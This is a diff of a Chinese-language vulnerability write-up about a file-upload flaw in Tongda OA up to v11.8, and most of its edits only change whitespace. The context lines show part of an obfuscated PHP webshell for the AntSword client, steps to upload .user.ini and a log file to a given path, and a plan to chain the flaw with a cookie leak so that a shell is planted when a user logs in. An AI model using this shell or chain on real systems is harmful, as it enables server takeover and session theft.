@@ -11,17 +11,17 @@ source: "MrWQ/vulnerability-paper"
 
 **一****：漏洞描述🐑**
 
-前一篇文章简单介绍了利用方法，但 v11.7 与 v11.8 Webshell 命令无法执行  
+前一篇文章简单介绍了利用方法，但 v11.7 与 v11.8 Webshell 命令无法执行  
 
-昨天收到了来自 Russell 师傅的建议，上传蚁剑可连接的 Webshell 控制服务器  
+昨天收到了来自 Russell 师傅的建议，上传蚁剑可连接的 Webshell 控制服务器  
 
 并可以配合之前的通达 OA v11.7 的任意在线用户 Cookie 泄露来进一步渗透
 
-**二:  漏洞影响🐇**
+**二:  漏洞影响🐇**
 
-**通达 0A V11.8 以下**
+**通达 0A V11.8 以下**
 
-**三:  漏洞复现🐋**
+**三:  漏洞复现🐋**
 
 **蚁剑的 webshell 为**
 
@@ -33,7 +33,7 @@ $fOgT=create_function(base64_decode('JA==').chr(114195/993).str_rot13('b').str_r
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXBQiaLY6vMhiaOC5NWayXOR9P0xqmgqUpVdgvOMuCUOiaKJnfpZUnic226Q/640?wx_fmt=png)
 
-**上传 .user.ini 再上传 peiqi.log 后访问 URL 出现 PeiQi_Wiki 就是成功上传了**
+**上传 .user.ini 再上传 peiqi.log 后访问 URL 出现 PeiQi_Wiki 就是成功上传了**
 
 ```
 http://192.168.1.103/general/reportshop/workshop/report/attachment-remark/form.inc.php?
@@ -51,13 +51,13 @@ http://192.168.1.103/general/reportshop/workshop/report/attachment-remark/form.i
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXiae4RiaeNGdP3X7PjVfjFXibs1QF103Y131c76J9PxmEnGqz1vn7SyPvQ/640?wx_fmt=png)
 
-**配合 之前的通达 OA v11.7 以下的在线用户 Cookie 泄露**
+**配合 之前的通达 OA v11.7 以下的在线用户 Cookie 泄露**
 
 **一旦用户登录 OA 系统时就主动上传 Webshell**
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXarSzexOYwe2nZ7lZUBC8IZibhHlsUYXfDcIwJL9cnQs6jpjfXxC75bg/640?wx_fmt=png)
 
-****四:  漏洞 POC🦉****
+****四:  漏洞 POC🦉****
 
 ```
 https://github.com/PeiQi0/PeiQi-WIKI-POC
